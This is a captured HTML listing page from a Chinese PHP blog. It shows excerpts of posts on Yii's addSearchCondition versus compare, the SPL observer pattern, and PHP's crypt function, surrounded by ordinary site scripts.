+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/the-difference-between-addSearchCondition-and-compare-in-Yii/" class="post-title-link" itemprop="url">Yii的CDbCriteria中addSearchCondition与compare的区别</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-05-22 03:36:27" itemprop="dateCreated datePublished" datetime="2014-05-22T03:36:27+08:00">2014-05-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-15 10:38:09" itemprop="dateModified" datetime="2025-04-15T10:38:09+08:00">2025-04-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index">
+                    <span itemprop="name">PHP</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在使用Yii过程中发现CDbCriteria类中addSearchCondition与compare的功能似乎都是用于增加搜索条件的，但仔细看其代码之后还是有区别的。 这里我就讲一下使用方法吧，不讲原理了，讲原理要分析其代码涉及很多。</p>
+<h1 id="addSearchCondition第一个参数为搜索的字段名"><a href="#addSearchCondition第一个参数为搜索的字段名" class="headerlink" title="addSearchCondition第一个参数为搜索的字段名"></a>addSearchCondition第一个参数为搜索的字段名</h1><p>第二个参数为搜索关键词 第三个参数是设置是否过滤掉你关键词中的“%”百分号和”_“下划线这两个通配符，默认是true，即过滤这两个通配符，并在关键词前后自动加上”%”以进行匹配。第四个参数就是条件连接符，默认为AND，最后一个是Sql 关键字”LIKE”，还可以设置为“NOT LIKE”。基本上最后两个参数都不需要自己设置，都使用默认值就好了。 <strong>addSearchCondition就大致理解为增加一个LIKE搜索条件即可。</strong></p>
+<h1 id="compare"><a href="#compare" class="headerlink" title="compare"></a>compare</h1><p>第一个参数一样为搜索的字段名 第二个参数也是关键词，但不同点也在于此，你可以在关键词开头加”&lt;”、”&gt;”、”&lt;=”、”&gt;=”、”&lt;&gt;”这四个比较符号，组成的sql语句就类似[字段名][比较符号][搜索关键词]，如我搜一个商品价格小于5的东西就这么写：compare(‘price’,’&lt;5’)，查询相当于这样”price &lt; 5”，它会自动提取开头的比较符号，如果你没写比较符号，那默认的就是”=”等于符号，写成这样compare(‘price’,’5’)就相当于’price=5’这种效果。 第三个参数是开启模糊匹配，默认是false关闭的，开启后，会调用上面的addSearchCondition方法，也就又使用了LIKE。compare(‘price’,’5’,true)即price LIKE %5%，compare(‘price’,’&lt;&gt;5’,true)即price NOT LIKE %5%，如果使用其他比较符号如compare(‘price’,’&lt;=5’,true)、compare(‘price’,’&gt;5’,true)等，使不会增加addSearchCondition的。 第四个参数是条件连接符AND，当然可以设置为其他的。 第五个参数是设置addSearchCondition中第三个条件的，当然你前面的参数要确保能调用addSearchCondition这个方法。 <strong>compare可以这么理解，相当于使用”&lt;”、”&gt;”、”&lt;=”、”&gt;=”、”&lt;&gt;”来比较值，启用模糊匹配就使用LIKE方式。</strong>   差不多就是这些吧，如果还有不明白的可以提出，我再讲细一点。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/observer-mode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/observer-mode/" class="post-title-link" itemprop="url">了解PHP设计模式之观察者模式</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-05-11 04:22:54" itemprop="dateCreated datePublished" datetime="2014-05-11T04:22:54+08:00">2014-05-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-15 10:38:09" itemprop="dateModified" datetime="2025-04-15T10:38:09+08:00">2025-04-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index">
+                    <span itemprop="name">PHP</span>
+                  </a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" itemprop="url" rel="index">
+                    <span itemprop="name">设计模式</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>观察者模式是一种事件系统，意味着这一模式允许某个类观察另一个类的状态，当被观察的类状态发生改变的时候，观察类可以收到通知并且做出相应的动作，观察者模式提供了避免组件之间紧密耦合的另一种方式。</p>
+<p>在观察者模式中，被观察者称为subject,观察者称为observer,为了表达这些内容，SPL（Standard PHP Libaray）提供了SplSubject(被观察者)和SplObserver(观察者)两个接口。在编写观察者模式时，只要实现这两个接口即可。接口如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//被观察者接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">SplSubject</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">attach</span><span class="params">(SplObserver $observer)</span></span>;<span class="comment">//注册观察者（注册的观察者：当我（被观察者）的某个状态改变时，需要通知的对象）</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detach</span><span class="params">(SplObserver $observer)</span></span>;<span class="comment">//释放观察者</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">notify</span><span class="params">()</span></span>;<span class="comment">//通知所有注册的观察者的方法</span></span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">//观察者接口</span></span><br><span class="line">  <span class="class"><span class="keyword">interface</span> <span class="title">SplObserver</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">(SplSubject $subject)</span></span>;<span class="comment">//观察者进行更新状态</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/observer-mode/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/crypt-encryption-functions-in-PHP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpg">
+      <meta itemprop="name" content="Veitor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veitor的技术点滴">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/crypt-encryption-functions-in-PHP/" class="post-title-link" itemprop="url">了解PHP中crypt加密函数</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2014-05-10 08:33:05" itemprop="dateCreated datePublished" datetime="2014-05-10T08:33:05+08:00">2014-05-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-15 10:38:09" itemprop="dateModified" datetime="2025-04-15T10:38:09+08:00">2025-04-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index">
+                    <span itemprop="name">PHP</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>曾经在分析Yii框架的博客demo中看到使用了这个crypt函数，于是就大致的了解了一下。</p>
+<p>crypt() 返回一个基于标准 UNIX DES 算法或系统上其他可用的替代算法的散列字符串，这是手册中写到的，可能有些同学不是很理解这句话，我的理解就是，crypt回返回不同类型的散列字符串，即使用了不同算法返回的。而具体使用哪个算法，还要看所以来的操作系统。 PHP中有几个常量，分别是CRYPT_STD_DES 、CRYPT_EXT_DES、CRYPT_MD5、CRYPT_BLOWFISH、CRYPT_SHA256、CRYPT_SHA512。 这些常量不是1就是0，也意味着其所对应的算法是否可用。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/crypt-encryption-functions-in-PHP/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+  </div>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Veitor"
+      src="/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Veitor</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">81</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">60</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/veitor" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;veitor" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/veitor" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;veitor" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Veitor_424" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Veitor_424" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="noopener" target="_blank">苏ICP备14016154号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Veitor</span>
+</div>
+
+        
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1253040939&web_id=1253040939"></script>
+  </div>
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
